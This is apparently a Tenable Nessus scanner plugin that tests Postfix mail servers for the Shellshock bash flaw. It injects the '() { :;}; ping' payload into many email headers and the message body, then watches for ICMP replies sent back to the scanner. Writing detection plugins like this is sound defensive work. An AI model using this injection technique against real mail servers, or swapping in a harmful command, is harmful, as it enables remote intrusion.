#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(77969);
  script_version("$Revision: 1.12 $");
  script_cvs_date("$Date: 2017/04/25 20:29:05 $");

  script_cve_id("CVE-2014-6271", "CVE-2014-7169");
  script_bugtraq_id(70103, 70137);
  script_osvdb_id(112004);
  script_xref(name:"CERT", value:"252743");
  script_xref(name:"EDB-ID", value:"34765");
  script_xref(name:"EDB-ID", value:"34766");
  script_xref(name:"EDB-ID", value:"34777");
  script_xref(name:"EDB-ID", value:"34896");
  script_xref(name:"IAVA", value:"2014-A-0142");

  script_name(english:"Postfix Script Remote Command Execution via Shellshock");
  script_summary(english:"Attempts to run a command remotely via a Postfix script.");

  script_set_attribute(attribute:"synopsis", value:
"The remote mail server uses scripts that allow remote command
execution via Shellshock.");
  script_set_attribute(attribute:"description", value:
"The remote host appears to be running Postfix. Postfix itself is not
vulnerable to Shellshock; however, any bash script Postfix runs for
filtering or other tasks could potentially be affected if the script
exports an environmental variable from the content or headers of a
message.

A negative result from this plugin does not prove conclusively that
the remote system is not affected by Shellshock, only that any scripts
Postfix may be running do not create the conditions that are
exploitable via the Shellshock flaw.");
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/oss-sec/2014/q3/650");
  # https://securityblog.redhat.com/2014/09/24/bash-specially-crafted-environment-variables-code-injection-attack/
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?dacf7829");
  script_set_attribute(attribute:"see_also", value:"https://www.invisiblethreat.ca/post/shellshock/");
  script_set_attribute(attribute:"solution", value:"Apply the referenced Bash patch or remove the Postfix scripts.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_core", value:"true");
  script_set_attribute(attribute:"exploited_by_malware", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Apache mod_cgi Bash Environment Variable Code Injection (Shellshock)');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2014/09/24");
  script_set_attribute(attribute:"patch_publication_date", value:"2014/09/26");
  script_set_attribute(attribute:"plugin_publication_date", value:"2014/09/29");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:postfix:postfix");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:gnu:bash");
  script_set_attribute(attribute:"stig_severity", value:"I");
  script_set_attribute(attribute:"in_the_news", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"SMTP problems");
  script_copyright(english:"This script is Copyright (C) 2014-2017 Tenable Network Security, Inc.");

  script_dependencies("smtpserver_detect.nasl");
  script_require_keys("Settings/ThoroughTests");
  script_require_ports("Services/smtp", 25);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("byte_func.inc");
include("misc_func.inc");
include("smtp_func.inc");

if (! thorough_tests ) audit(AUDIT_THOROUGH);

port = get_service(svc: "smtp", default: 25, exit_on_fail: 1);

# Don't really care if its not postfix
ispf = get_kb_item("SMTP/"+port+"/postfix");
if(isnull(ispf) || !ispf) audit(AUDIT_NOT_DETECT,"Postfix",port);

# Open a connection.
soc = smtp_open(port:port, helo:this_host_name());
if (!soc) audit(AUDIT_SVC_FAIL,"SMTP",port);

# The data headers we want to try this attack on
headers = make_list(
 "To:",
 "References:",
 "Cc:",
 "Bcc:",
 "From:",
 "Subject:",
 "Date:",
 "Message-ID:",
 "Comments:",
 "Keywords:",
 "Resent-Date:",
 "Resent-From:",
 "Resent-Sender:",
 "" # For the actual text of the email
);

# Build the attack data
ptrn = rand_str(length:10);
data = "";
id = 0;
foreach head (headers)
{
  hkey = hexstr(mkbyte(id));
  data += head+"() { :;}; ping -p "+hkey+hexstr(ptrn)+" -c 3 "+this_host_name()+'\n';
  id += 1;
}
ptrn = hexstr(ptrn);

# Do the SMTP boogaloo, for postfix FROM/TO have to be valid
send(socket:soc,data:'MAIL FROM: <>\r\n');
s = smtp_recv_line(socket:soc);
if(!strlen(s) || !ereg(pattern:"^[2-3][0-9][0-9] .*", string:s))
{
  close(soc);
  audit(AUDIT_SVC_ERR,port);
}
send(socket:soc,data:'RCPT TO: <nobody>\r\n');
s = smtp_recv_line(socket:soc);
if(!strlen(s) || !ereg(pattern:"^[2-3][0-9][0-9] .*", string:s))
{
  close(soc);
  audit(AUDIT_SVC_ERR,port);
}
send(socket:soc,data:'DATA\r\n');
s = smtp_recv_line(socket:soc);
if(!strlen(s) || !ereg(pattern:"^[2-3][0-9][0-9] .*", string:s))
{
  close(soc);
  audit(AUDIT_SVC_ERR,port);
}

# See if we get a response
filter = string("icmp and icmp[0] = 8 and src host ", get_host_ip());
s = send_capture(socket:soc,data:data+'\r\n.\r\n',pcap_filter:filter);
s = tolower(hexstr(get_icmp_element(icmp:s,element:"data")));
close(soc);

# No response, meaning we didn't get in
if(isnull(s) || ptrn >!< s) audit(AUDIT_LISTEN_NOT_VULN,"Postfix",port);

# Figure out what let us in
hkey = eregmatch(pattern:"(\d\d)"+ptrn,string:s);

# Should never happen
if(empty_or_null(hkey)) exit(1,"Could not match pattern to response.");

hkey = int(getbyte(blob:hex2raw(s:hkey[1]),pos:0));

# Should never happen
if(hkey > max_index(headers)) exit(1, "Strange header key in response.");

header = headers[hkey];
if(header == "")
  header = "text contents";
else
  header = "'"+str_replace(string:header, find:":", replace:"")+"' header";

if(report_verbosity > 0)
{
  report = 'The '+tolower(header)+' of the message was used to execute a remote command.';
  security_hole(port:port,extra:report);
} else security_hole(port);
